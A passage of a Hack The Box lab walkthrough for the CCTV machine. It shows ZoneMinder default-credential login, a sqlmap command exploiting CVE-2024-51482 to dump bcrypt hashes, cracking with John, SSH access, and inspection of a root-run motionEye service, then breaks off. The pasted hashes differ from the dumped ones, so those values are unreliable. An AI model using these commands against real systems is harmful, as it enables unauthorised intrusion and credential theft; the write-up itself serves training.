CCTV Hack the Box Walkthrough
=============================

Welcome to another Hack the Box walkthrough. In this blog post, I have demonstrated how I owned the CCTV machine on Hack the Box. Hack The Box is a cybersecurity platform that helps you bridge knowledge gaps and prepares you for cyber security jobs.

You can also test and grow your penetration testing skills, from gathering information to reporting. If you are new to this blog, please do not forget to like, comment and subscribe to my YouTube channel and follow me on LinkedIn for more updates.

  

About the Machine
-----------------

**CCTV** is an **easy-difficulty Linux machine** on Hack The Box that focuses on web application exploitation, credential extraction through SQL injection, and privilege escalation through a vulnerable CCTV management platform. The machine demonstrates how weaknesses in web applications, poor credential management, and insecure service configurations can lead to full system compromise.

The attack begins with **web application discovery** on the target host, which reveals a **SecureVision CCTV monitoring website**. Further exploration exposes a **ZoneMinder surveillance management interface**, where default credentials allow access to the administrative dashboard. Research into the deployed software version leads to the discovery of **CVE-2024-51482**, a **time-based blind SQL injection vulnerability** in the `tid` parameter.

Exploiting this vulnerability enables **database enumeration via SQL injection**, allowing extraction of credentials stored in the `zm.Users` table. The retrieved password hashes are then subjected to **offline password cracking**, revealing a weak password for the user **mark**. Using these credentials, SSH access is obtained, providing an initial foothold on the system.

During **post-exploitation enumeration**, analysis of system services reveals that **motionEye**, another surveillance management application, is installed and running with **root privileges**. Inspection of the motionEye configuration file exposes an administrator password hash and confirms that the web interface runs only on the localhost interface. Application logs further reveal that the system actively interacts with the motionEye API through a service account.

To interact with this restricted interface, **SSH local port forwarding** is used to expose the motionEye web UI on the attacker machine. Authentication to the interface is then achieved using the discovered administrator credentials.

Further vulnerability research identifies **CVE-2025-60787**, a **command injection vulnerability in motionEye ≤ 0.43.1b4**. By bypassing the application's client-side input validation and injecting a malicious payload into a configuration parameter, arbitrary commands can be executed when the Motion service reloads its configuration.

After **preparing a reverse shell listener**, the exploit is executed to trigger the command injection, resulting in a **reverse shell running as root**. This provides full administrative access to the system.

With root privileges established, the **root flag is retrieved from the root user’s home directory**, completing the compromise. Finally, exploration of the `/home` directory reveals another user account, **sa\_mark**, where the **user flag** is located.

Overall, CCTV highlights the risks associated with **web application vulnerabilities, weak credential practices, and insecure service configurations**, demonstrating how attackers can chain multiple weaknesses together to escalate from initial access to full root compromise.

[![htb hercules writeup](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgq7OnDMHJwPMUyXCCiSdrffSXweoYnnjobQrqdxuV9bIMkHeDVNsCuqar2M3clTNI6U95nbBQwusslrdtwsSUNTYMQaVrcjWUo29rZpMiVqyVh41keRd_VqaekBWXJNMLQma0RYcfRvitwis6TuVzrRqriTL1eD5dIKAHHNn0oEDKdrw97eGoWQZ242t8E/s16000/bandicam%202026-03-09%2018-14-13-381.jpg "htb hercules writeup")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgq7OnDMHJwPMUyXCCiSdrffSXweoYnnjobQrqdxuV9bIMkHeDVNsCuqar2M3clTNI6U95nbBQwusslrdtwsSUNTYMQaVrcjWUo29rZpMiVqyVh41keRd_VqaekBWXJNMLQma0RYcfRvitwis6TuVzrRqriTL1eD5dIKAHHNn0oEDKdrw97eGoWQZ242t8E/s1046/bandicam%202026-03-09%2018-14-13-381.jpg)

The first step in owning the CCTV machine like I have always done in my previous writeups is to connect my Kali Linux terminal with Hack the Box server. To establish this connection, I ran the following command in the terminal:
```
sudo openvpn cctv.ovpn
```

[![cctv.htb](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrRK9iPSX9pAU6i8hnWM2cjmUg38v35yZsHmY2TkhhS7xW8C-zkByflXoQXu5y5A_zbjozhiuRQLNHyWHiGKYOCGOBQM2PKEr8XL5BUlIc7YX3w0Xp6FFQ2TeLwZ4hi3thFRsPcaIoh9jtVXKRO4I7OQqguaiwJy022uFCclosuG2WV-auL4X89Ieg73cK/s16000/bandicam%202026-03-09%2013-33-36-440.jpg "cctv.htb")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrRK9iPSX9pAU6i8hnWM2cjmUg38v35yZsHmY2TkhhS7xW8C-zkByflXoQXu5y5A_zbjozhiuRQLNHyWHiGKYOCGOBQM2PKEr8XL5BUlIc7YX3w0Xp6FFQ2TeLwZ4hi3thFRsPcaIoh9jtVXKRO4I7OQqguaiwJy022uFCclosuG2WV-auL4X89Ieg73cK/s1833/bandicam%202026-03-09%2013-33-36-440.jpg)

Once the connection between my Kali Linux terminal and Hack the Box server has been established, I started the CCTV HTB machine and I was assigned an IP address (10.129.119.247).

[![hackthebox cctv](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoWhckobtysi_REACalxjpP70DAoXHM2FTKrhH_K-2yfv_LYrGmXy2BVjk5SKXY8KwR80xE9-ol-Fcr_n0HJe5TERmKnm0LtFroXLxTDsaiVdLb6biNmL4n1Za558dl_V4_G5zFiha-IwTE9EAV4I7Qz77IhS7YC2Jw2eCau9CTJWilbPUB9yGP7lS1Ivd/s16000/bandicam%202026-03-09%2013-36-37-470.jpg "hackthebox cctv")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoWhckobtysi_REACalxjpP70DAoXHM2FTKrhH_K-2yfv_LYrGmXy2BVjk5SKXY8KwR80xE9-ol-Fcr_n0HJe5TERmKnm0LtFroXLxTDsaiVdLb6biNmL4n1Za558dl_V4_G5zFiha-IwTE9EAV4I7Qz77IhS7YC2Jw2eCau9CTJWilbPUB9yGP7lS1Ivd/s1833/bandicam%202026-03-09%2013-36-37-470.jpg)

  

Host Resolution Configuration
-----------------------------

Before beginning enumeration, I configured local host resolution for the target machine. I added an entry to my `/etc/hosts` file mapping the IP address `10.129.119.247` to the hostname `cctv.htb`.
```
echo "10.129.119.247 cctv.htb" | sudo tee -a /etc/hosts
```
[![cctv htb write up](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpewbT59rX9Ssjl3tbS29X4yRpqBefOZRfqExjPeB7ri6axdMa1u-REGR5sjt-1nuRLeREOkV3TQTs1VRYcuiUSryVipFJTBOxW_Tq9pIsGO2AictMDS2HOZb8d0t8pYbPkEMiJBOW1WW3UGyYAw87P5WmvmFKyV0o242g1UnS0IG_ThyphenhyphenOQOQOFsdx6tQh/s16000/bandicam%202026-03-09%2013-43-05-226.jpg "cctv htb write up")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpewbT59rX9Ssjl3tbS29X4yRpqBefOZRfqExjPeB7ri6axdMa1u-REGR5sjt-1nuRLeREOkV3TQTs1VRYcuiUSryVipFJTBOxW_Tq9pIsGO2AictMDS2HOZb8d0t8pYbPkEMiJBOW1WW3UGyYAw87P5WmvmFKyV0o242g1UnS0IG_ThyphenhyphenOQOQOFsdx6tQh/s1833/bandicam%202026-03-09%2013-43-05-226.jpg)

This step ensures that my system can resolve the domain name used by the target application. Many Hack The Box machines rely on **virtual host routing**, meaning the web server expects requests to be made using a specific hostname rather than the raw IP address.

By adding this entry, any requests I make to `cctv.htb` are automatically directed to the target machine. This allows the web application to behave as intended during enumeration and exploitation.

  

Full TCP Port Scan
------------------

After configuring host resolution, I began network enumeration by running a full TCP port scan using **Nmap**. I used the `-p-` option to scan all **65,535 TCP ports**, ensuring that no exposed services were missed.
```
nmap -p- --min-rate 5000 -sS 10.129.119.247
```
[![cctv htb walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyR8iSAZFlsApbFEs8f0gEB6_P6mrNlXu0HtlBu_Kr1iPiFpLyzvrNJdSP4Bu4BKeUX0ySLsUhS0O6NDNzDiQ-5pGMr-oIeHy8NmGAF4RB0cnLIl6mM2GWFdkqIcNhuJudk9TP-0epZ_y4qeBkNvHTGU2Cz-cI9cRVXcHG9z-I3uarEDxpO-wWTCRhn5Ze/s16000/bandicam%202026-03-09%2013-44-07-362.jpg "cctv htb walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyR8iSAZFlsApbFEs8f0gEB6_P6mrNlXu0HtlBu_Kr1iPiFpLyzvrNJdSP4Bu4BKeUX0ySLsUhS0O6NDNzDiQ-5pGMr-oIeHy8NmGAF4RB0cnLIl6mM2GWFdkqIcNhuJudk9TP-0epZ_y4qeBkNvHTGU2Cz-cI9cRVXcHG9z-I3uarEDxpO-wWTCRhn5Ze/s1833/bandicam%202026-03-09%2013-44-07-362.jpg)

To accelerate the scan, I included `--min-rate 5000`, which forces Nmap to send packets at a minimum rate of 5000 per second. I also used `-sS` to perform a **SYN scan**, a commonly used reconnaissance technique that is both fast and relatively stealthy.

The scan revealed that the target host was reachable and exposed two open ports:

1.  **22/tcp - SSH**
2.  **80/tcp - HTTP**

All other ports were either **filtered** or **closed**, indicating that they were either protected by a firewall or not actively listening.

Since SSH typically requires valid credentials and does not provide an immediate unauthenticated attack surface, I shifted my focus to **port 80**, the web service. This indicated that the primary attack surface for this machine would likely involve **web application enumeration**, which would be the next step in the assessment.

  

Web Application Discovery
-------------------------

After identifying **port 80** as the primary attack surface during the Nmap scan, I proceeded to interact with the web service directly through my browser.

I navigated to the target IP address in the browser:
```
http://10.129.119.247
```
Upon loading the page, the server automatically redirected my request to the hostname **`http://cctv.htb/`**, confirming that the application relies on **virtual host routing**. This validated the earlier step where I configured local host resolution in `/etc/hosts`, allowing the domain to resolve correctly.

[![cctv hack the box write up](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibj3hmrcg-YI6YB3QEMjoFx49eYRPMa_1G4VtO6t3f4BvHs_3vsR8wVRtu2V3bmTJhEOeJoHphyzt4HroMIgwb0CiaOlGap9nafPLMNCJyGYzNmPdCK2ky32DU8z2ZUUElnw9KoTHD6taL7m-PpTL5s3wfYH10atvXtlwZ5sIum6p_z5jajNs4uodkm_jO/s16000/bandicam%202026-03-09%2013-48-01-152.jpg "cctv hack the box write up")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibj3hmrcg-YI6YB3QEMjoFx49eYRPMa_1G4VtO6t3f4BvHs_3vsR8wVRtu2V3bmTJhEOeJoHphyzt4HroMIgwb0CiaOlGap9nafPLMNCJyGYzNmPdCK2ky32DU8z2ZUUElnw9KoTHD6taL7m-PpTL5s3wfYH10atvXtlwZ5sIum6p_z5jajNs4uodkm_jO/s1833/bandicam%202026-03-09%2013-48-01-152.jpg)

The landing page presented a **SecureVision CCTV monitoring website**, advertising surveillance services such as camera monitoring, access control systems, installation, and maintenance. The page also contained a **“Staff Login”** option, suggesting that the application likely provides an internal management interface for employees.

During further enumeration, I manually explored additional paths on the web server and discovered a directory associated with a surveillance management platform. I accessed the following endpoint:
```
http://cctv.htb/zm/
```
This page revealed a **ZoneMinder login portal**, specifically **ZoneMinder v1.37.63**, which is an open-source video surveillance management system commonly used for CCTV deployments.

Recognizing that many default installations of ZoneMinder ship with **default administrative credentials**, I attempted to authenticate using the widely known defaults:
```
Username: admin
Password: admin
```
[![owned cctv from hack the box](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9AWbAxYY5pMsmbJvgMHyyPUqbNR8h7xv6vtfCueMpBd3vS2VO52d5UcLIjS4h1OYA6-F3cXA4T-mTgf6YO4xfl5SGdu5OMb6PP8FCOILaWHaCKyEPRrbH2jDf_UY49eSyZ5W_80KIMtmDFN7prs-d7KZFrIupSTggCoK5evcT3GaApzzugrq1_Shb5cDd/s16000/bandicam%202026-03-09%2013-53-41-963.jpg "owned cctv from hack the box")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9AWbAxYY5pMsmbJvgMHyyPUqbNR8h7xv6vtfCueMpBd3vS2VO52d5UcLIjS4h1OYA6-F3cXA4T-mTgf6YO4xfl5SGdu5OMb6PP8FCOILaWHaCKyEPRrbH2jDf_UY49eSyZ5W_80KIMtmDFN7prs-d7KZFrIupSTggCoK5evcT3GaApzzugrq1_Shb5cDd/s1833/bandicam%202026-03-09%2013-53-41-963.jpg)

The authentication attempt was successful, granting me access to the **ZoneMinder administrative dashboard**. This confirmed that the system was running with **unchanged default credentials**, exposing the internal surveillance management interface to unauthorized access.

Gaining access to the ZoneMinder dashboard significantly expanded the attack surface, as administrative access typically provides functionality for managing cameras, executing system actions, and interacting with backend services. This made the application a promising vector for further enumeration and potential exploitation.

  

Vulnerability Research - ZoneMinder SQL Injection (CVE-2024-51482)
------------------------------------------------------------------

After gaining access to the **ZoneMinder dashboard**, I began researching known vulnerabilities affecting **ZoneMinder v1.37.63**. During this process, I identified **CVE-2024-51482**, a vulnerability affecting the ZoneMinder web interface that allows **Boolean/time-based blind SQL injection**.
```
https://github.com/BwithE/CVE-2024-51482
```
[![cctv htb complete solution hack the box write up walkthrough easy linux machine](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtUWKHruwYyjHM7GVoYOVCnRAJFSF_y5QCXtvG4K2Z91HVn23H_2xAvLWzZXCWg5YHOFOBJFnGh9y92U2rOXwbNq_29XrfNmsHIoGJ7yTDBQFFR5ub6uxMuo_IOpV696xcKWYwCKGpTZG9EOVIONiKh_0KbjwL_m7kBaC-r7KEeI8sYnoKs97RXBgSnUJF/s16000/bandicam%202026-03-09%2020-46-38-137.jpg "cctv htb complete solution hack the box write up walkthrough easy linux machine")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtUWKHruwYyjHM7GVoYOVCnRAJFSF_y5QCXtvG4K2Z91HVn23H_2xAvLWzZXCWg5YHOFOBJFnGh9y92U2rOXwbNq_29XrfNmsHIoGJ7yTDBQFFR5ub6uxMuo_IOpV696xcKWYwCKGpTZG9EOVIONiKh_0KbjwL_m7kBaC-r7KEeI8sYnoKs97RXBgSnUJF/s1833/bandicam%202026-03-09%2020-46-38-137.jpg)

The vulnerability occurs in the **`tid` parameter** of the following endpoint:
```
/zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD></PAYLOAD>
```
The `tid` parameter is incorporated directly into a backend **MySQL query without proper sanitization**, allowing attackers to inject SQL statements. Because the application does not return query results directly in the response, the vulnerability is exploitable through **time-based blind SQL injection**, where database responses are inferred based on server response delays.

Although the vulnerability itself does not require authentication, the endpoint requires a **valid ZoneMinder session**, meaning a session cookie must be supplied with the request.

  

Session Cookie Extraction for Authenticated Exploitation
--------------------------------------------------------

During vulnerability research, I discovered that although the **ZoneMinder SQL injection vulnerability (CVE-2024-51482)** can be exploited without traditional authentication checks in the vulnerable query, the affected endpoint still requires a **valid ZoneMinder session** to process requests. This means that any exploitation attempt must include a legitimate **session cookie**.

Since I had already authenticated to the **ZoneMinder dashboard** using the default credentials discovered earlier, I proceeded to extract my active session token from the browser.

To do this, I opened the **browser developer tools (F12)** and navigated to the **Storage → Cookies** section. Under the `http://cctv.htb` domain, I located the active session cookie used by the application.

The cookie of interest was:
```
ZMSESSID=jinco4bhig0up657ul2h5u4rjk
```
[![CCTV Hack the Box Walkthrough Machine Solution](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFE5a0ilZ-G19cWy31wvaiUlXWQfqv-B6BnU3KKvFxkzDRb1Yvyyqzsr1EDJdCcXr2zY8GusxJoi4g_S-f0w5ehPpTF5xxvyQ4rAwxHR821F_5Hzc1JQo-ww8rXGsymSpqX0LN8kkCp2n_MFVbySOKOXKfcBT08QzETArG2GIB2CE3GQmJyqrv4aCD2jEV/s16000/bandicam%202026-03-09%2021-00-29-246.jpg "CCTV Hack the Box Walkthrough Machine Solution")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFE5a0ilZ-G19cWy31wvaiUlXWQfqv-B6BnU3KKvFxkzDRb1Yvyyqzsr1EDJdCcXr2zY8GusxJoi4g_S-f0w5ehPpTF5xxvyQ4rAwxHR821F_5Hzc1JQo-ww8rXGsymSpqX0LN8kkCp2n_MFVbySOKOXKfcBT08QzETArG2GIB2CE3GQmJyqrv4aCD2jEV/s1833/bandicam%202026-03-09%2021-00-29-246.jpg)

The **`ZMSESSID` cookie** represents the authenticated session identifier generated by ZoneMinder after a successful login. This token allows the server to associate subsequent requests with the authenticated user session.

Because the vulnerable endpoint validates that requests originate from an authenticated session, I needed to include this cookie when performing the SQL injection attack. Without it, the server would reject the request before the vulnerable query could be executed.

After capturing the cookie value, I supplied it to **sqlmap** using the `--cookie` parameter. This allowed sqlmap to replay requests as an authenticated user while performing the time-based SQL injection against the vulnerable `tid` parameter.

By reusing the legitimate session cookie, my requests were treated as trusted by the application, enabling successful exploitation of the SQL injection vulnerability and subsequent database enumeration.

  

Database Enumeration via SQL Injection
--------------------------------------

After confirming the **time-based blind SQL injection** in the `tid` parameter, I proceeded to extract credential data directly from the backend database using **sqlmap**. Since the vulnerability allowed database interaction through delayed responses, sqlmap automated the process of reconstructing query results by measuring server response times.

I executed the following command to extract user credentials from the ZoneMinder database:
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-D zm -T Users -C Username,Password --dump --batch \
--dbms=MySQL --technique=T \
--cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk" \
--time-sec=2
```
[![CCTV htb easy linux cctv.htb write up walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHt5wpF9sUp48FEYLKrr7ZAaLjdJppgg8H64bdQcIwndaZp7gc4ZeLX5x-2vjGa9RKa7844olZe0m6QCyGfM9aHCTant859QTQnPyHJjpMmYB9C1hwO5bR3yJpPMq7PwqHpblV5qErV7c2VWErB1NN53K2waSkCawaFy_SZ1eND9DE8xkRckt6O1ZS3jZc/s16000/bandicam%202026-03-09%2014-07-55-789.jpg "CCTV htb easy linux cctv.htb write up walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHt5wpF9sUp48FEYLKrr7ZAaLjdJppgg8H64bdQcIwndaZp7gc4ZeLX5x-2vjGa9RKa7844olZe0m6QCyGfM9aHCTant859QTQnPyHJjpMmYB9C1hwO5bR3yJpPMq7PwqHpblV5qErV7c2VWErB1NN53K2waSkCawaFy_SZ1eND9DE8xkRckt6O1ZS3jZc/s1833/bandicam%202026-03-09%2014-07-55-789.jpg)

In this command, I instructed **sqlmap** to target the vulnerable endpoint and focus specifically on the **`Users` table** inside the **`zm` database**. I requested the extraction of the **`Username`** and **`Password`** columns, which commonly contain authentication credentials.

Since the injection method was **time-based**, I forced sqlmap to use the `T` technique (`--technique=T`) and configured a two-second delay (`--time-sec=2`) for response-time comparisons. I also included the **`ZMSESSID` session cookie**, which allowed sqlmap to perform authenticated requests against the ZoneMinder application.

During execution, sqlmap resumed the previously identified injection point and confirmed that the backend database management system was **MySQL**, running behind an **Apache 2.4.58** web server on **Ubuntu Linux**.

Because the attack relied on time-based inference, data extraction occurred slowly and required many HTTP requests. This resulted in numerous **HTTP 500 responses**, which are common when exploiting blind SQL injection against unstable endpoints. Despite these interruptions, sqlmap was able to successfully reconstruct the database contents.

[![cctv htb machine linux write up](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZ4dxvbb3QVq_UQbL3F8LgA33bbYkoc3oqZ_fhXFyPGTLWFgZ_endIAOV4ShKkyu8kBTJPDe-U1fWi5BHskW3TYEAQWs9Id8PopdulMS_pxQ5qNez4sB05V5HRvJLuVg2lm7Bll8QRc4pJrlZFvM62aHeCTbgJSA5RQzpNh2MFWrAbd4lYNhsh2LbBTcb1/s16000/bandicam%202026-03-09%2014-08-48-127.jpg "cctv htb machine linux write up")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZ4dxvbb3QVq_UQbL3F8LgA33bbYkoc3oqZ_fhXFyPGTLWFgZ_endIAOV4ShKkyu8kBTJPDe-U1fWi5BHskW3TYEAQWs9Id8PopdulMS_pxQ5qNez4sB05V5HRvJLuVg2lm7Bll8QRc4pJrlZFvM62aHeCTbgJSA5RQzpNh2MFWrAbd4lYNhsh2LbBTcb1/s1833/bandicam%202026-03-09%2014-08-48-127.jpg)

After completing the extraction process, sqlmap dumped the contents of the **`zm.Users`** table and revealed three user accounts along with their associated password hashes:
```
+-----------+------------------------------------------------------------------+
| Username | Password |
+-----------+------------------------------------------------------------------+
| superadmin| $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhluWM0jrtbm |
| mark | $2y$10$prZGnazejKcuTv5bKNexX0gLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1UignrIckdXrzJmJgkTiAvRUM6m |
+-----------+------------------------------------------------------------------+
```
The password values were stored as **bcrypt hashes**, indicating that ZoneMinder uses a secure password hashing scheme. These hashes would need to be **cracked offline** in order to recover the original plaintext passwords.

At this stage, I had successfully extracted **all user credential hashes** from the ZoneMinder database, providing potential authentication material that could be leveraged in the next phase of the attack.

  

Password Hash Cracking
----------------------

After successfully dumping the **ZoneMinder `Users` table**, I obtained three **bcrypt password hashes** associated with the accounts `superadmin`, `mark`, and `admin`. Since bcrypt hashes cannot be reversed directly, the next step was to attempt **offline password cracking** using a wordlist attack.

First, I created a text file to store the extracted hashes so they could be processed by a password cracking tool.
```
sudo nano zm\_users\_hash.txt
```
Inside the file, I pasted the hashes that were previously extracted from the database:
```
$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```
With the hashes stored locally, I used **John the Ripper** to perform a dictionary-based password cracking attempt using the widely used **rockyou.txt** wordlist.
```
john zm\_users\_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
[![CCTV HTB machine](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5nxM28gym82QYRr1zCTE5xI4jcrFLA6wA_D9gsqIOu6kBna_rdc-y14ND5GhlVdMBeqAsb5N7GyHZsVAvMptfvFq2D3YeVENQe8hLIRfxcuvFOBrJpCl2-21nl0a7HObdTEDT9xyTT3RNCdXJGtzeI7aW8xbeMA6mDfuxRet56_aZE6hYNq-txMfpvv20/s16000/bandicam%202026-03-09%2016-02-30-836.jpg "CCTV HTB machine")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5nxM28gym82QYRr1zCTE5xI4jcrFLA6wA_D9gsqIOu6kBna_rdc-y14ND5GhlVdMBeqAsb5N7GyHZsVAvMptfvFq2D3YeVENQe8hLIRfxcuvFOBrJpCl2-21nl0a7HObdTEDT9xyTT3RNCdXJGtzeI7aW8xbeMA6mDfuxRet56_aZE6hYNq-txMfpvv20/s1833/bandicam%202026-03-09%2016-02-30-836.jpg)

John automatically detected that the hashes were using the **bcrypt (Blowfish)** algorithm and began testing candidate passwords from the wordlist against the hashes.

During the cracking process, John successfully recovered one of the passwords:
```
opensesame
```
This indicated that one of the ZoneMinder user accounts was protected with a **weak and commonly used password**, making it vulnerable to a simple dictionary attack.

At this stage, I had recovered the plaintext password **`opensesame`**, which could now potentially be used to authenticate to other services on the target system, such as **SSH or additional application accounts**, in the next phase of the assessment.

  

Initial Access - SSH Authentication as Mark
-------------------------------------------

After recovering the plaintext password **`opensesame`** from the cracked bcrypt hash, I attempted to determine whether the credential could be reused to access other services on the target system. Since **port 22 (SSH)** had been identified earlier during the Nmap scan, SSH authentication was a natural next step.

I attempted to authenticate to the host as the user **mark** using the recovered password.
```
ssh mark@cctv.htb
```
[![cctv machine solution](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTjIHvY2NETTql2316ZyNNEllQQxuYbLJEG-Q0vFFZljsR_0UBvADWkrUT0aAwzDwMTeUB8qD0TDkM5eT_sXiRDw7HhNIr9xoZgAWT6Mpe9Ci38wT5fd6Y52-zVUgKihCH6SYDteUhn-fkBO3-d7ma6sU75DEyqCMK5ie3_UI3GHeb1ujLd100wLjICzEM/s16000/bandicam%202026-03-09%2016-10-45-607.jpg "cctv machine solution")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTjIHvY2NETTql2316ZyNNEllQQxuYbLJEG-Q0vFFZljsR_0UBvADWkrUT0aAwzDwMTeUB8qD0TDkM5eT_sXiRDw7HhNIr9xoZgAWT6Mpe9Ci38wT5fd6Y52-zVUgKihCH6SYDteUhn-fkBO3-d7ma6sU75DEyqCMK5ie3_UI3GHeb1ujLd100wLjICzEM/s1833/bandicam%202026-03-09%2016-10-45-607.jpg)

Once prompted for the password, I entered the recovered credential **`opensesame`**, which successfully authenticated me to the system.

With a shell established on the target machine, I began performing initial filesystem enumeration within the user’s home directory.
```
ls
```
The directory appeared empty at first glance, so I listed all files, including hidden ones.
```
ls -la
```
[![rooted cctv on hack the box](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj84L9krnxyNROHpqwAtvjPd8Ekv9PtphJ2POvuKTo0UocI5KH3-MTFw2FeFaFzqhV0T3NA4vCe46hjL5zL4emC0pPJrv8OsyPer0uBx_lgpc9kvpMCxutuXWP75-XYBZmg1Kdx6v33IKcFM7-0hqbur7LOlZsm526TTl6aTbKwRcKQYpUkYygofrORdMr3/s16000/bandicam%202026-03-09%2016-20-22-940.jpg "rooted cctv on hack the box")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj84L9krnxyNROHpqwAtvjPd8Ekv9PtphJ2POvuKTo0UocI5KH3-MTFw2FeFaFzqhV0T3NA4vCe46hjL5zL4emC0pPJrv8OsyPer0uBx_lgpc9kvpMCxutuXWP75-XYBZmg1Kdx6v33IKcFM7-0hqbur7LOlZsm526TTl6aTbKwRcKQYpUkYygofrORdMr3/s1833/bandicam%202026-03-09%2016-20-22-940.jpg)

This revealed several standard user configuration files such as `.bashrc`, `.profile`, and `.bash_logout`, along with directories like `.cache`, `.gnupg`, and `.ssh`. One notable observation was that the `.bash_history` file was symbolically linked to `/dev/null`, indicating that **command history logging had been intentionally disabled** for this account. This is sometimes done to prevent activity tracking on the system.

At this stage, I had successfully obtained **initial shell access as the user `mark`**, providing a foothold on the system and allowing me to begin **post-exploitation enumeration** to identify potential privilege escalation opportunities.

  

Post-Exploitation Enumeration - motionEye Service Analysis
----------------------------------------------------------

After obtaining a shell as **mark**, I began performing local enumeration to identify running services and potential privilege escalation vectors. Since the machine appeared to be related to a **CCTV infrastructure**, I focused on configuration files and services that might be responsible for video monitoring.

During this process, I discovered a **systemd service** related to **motionEye**, a web-based surveillance management system.
```
cat /etc/systemd/system/motioneye.service
```
[![pterodactyl hackthebox walkthrough](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2V0Olz-saZiKd4q-EBVsw2t0HxOqMuF_vM4hzV8zjIFW6SzMHxlJYh2hXK3xLzpWymv_ASMvHwRdukHgDtZE8sgqrYmv6Ee7VwNTCyma-ebyy2xpCBdhBjHTxkjtmjRsOwkLs-2z1hVXysBgCUqbHvqX6PeNxKcUWM_OMUtz296ErZYgu6CZn0LWBchqw/s16000/bandicam%202026-03-09%2016-38-04-530.jpg "pterodactyl hackthebox walkthrough")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2V0Olz-saZiKd4q-EBVsw2t0HxOqMuF_vM4hzV8zjIFW6SzMHxlJYh2hXK3xLzpWymv_ASMvHwRdukHgDtZE8sgqrYmv6Ee7VwNTCyma-ebyy2xpCBdhBjHTxkjtmjRsOwkLs-2z1hVXysBgCUqbHvqX6PeNxKcUWM_OMUtz296ErZYgu6CZn0LWBchqw/s1833/bandicam%202026-03-09%2016-38-04-530.jpg)

The service configuration revealed that the **motionEye server runs as the root user**, which immediately caught my attention.
```
[Service\]
User=root
RuntimeDirectory=motioneye
LogsDirectory=motioneye
StateDirectory=motioneye
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
Restart=on-abort
```
Running a service as **root** significantly increases the attack surface because any vulnerability within the application or its configuration could potentially lead to **privilege escalation to root**. The service also starts the motionEye server using the configuration file located at `/etc/motioneye/motioneye.conf`, making it a logical next target for inspection.

  

Inspecting motionEye Configuration
----------------------------------

To gather additional information, I opened the motionEye configuration file.
```
cat /etc/motioneye/motion.conf
```
[![htb overwatch](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSAetTbzPw18OCy9b1vhEwPbYirdTBflCWamoR8o26h73tok6b2J-TmZHELLCb-m8ew7rva4G-jKVighawsjWlpPj_v6PlE53MNmGhKSyD0JbUxeUHDOiwAq_wW0bi5HbrheKGWetZ-LrRTEKxR-zhUAz2-ylcD_oRv2j1tHnPpr_ZoIi7FUqWFEQjy8Rg/s16000/bandicam%202026-03-09%2016-36-34-328.jpg "htb overwatch")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSAetTbzPw18OCy9b1vhEwPbYirdTBflCWamoR8o26h73tok6b2J-TmZHELLCb-m8ew7rva4G-jKVighawsjWlpPj_v6PlE53MNmGhKSyD0JbUxeUHDOiwAq_wW0bi5HbrheKGWetZ-LrRTEKxR-zhUAz2-ylcD_oRv2j1tHnPpr_ZoIi7FUqWFEQjy8Rg/s1833/bandicam%202026-03-09%2016-36-34-328.jpg)

Inside the configuration file, I discovered commented configuration parameters that included an **administrator username and password hash**.
```
# @admin\_username admin
# @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```
The value associated with `admin_password` appeared to be a **SHA-1 hash**, which likely corresponds to the administrative password used by the motionEye interface. The configuration also indicated that the **web control interface runs on port 7999**, though it is restricted to the local interface:
```
webcontrol\_port 7999
webcontrol\_localhost on
```
This suggests that the motionEye management interface is **not directly exposed externally** and can only be accessed from the local system. However, since I already had shell access as `mark`, interacting with this service locally remained a viable option.

  

Investigating Application Logs
------------------------------

While continuing to explore the filesystem, I discovered a log file related to the video management system.
```
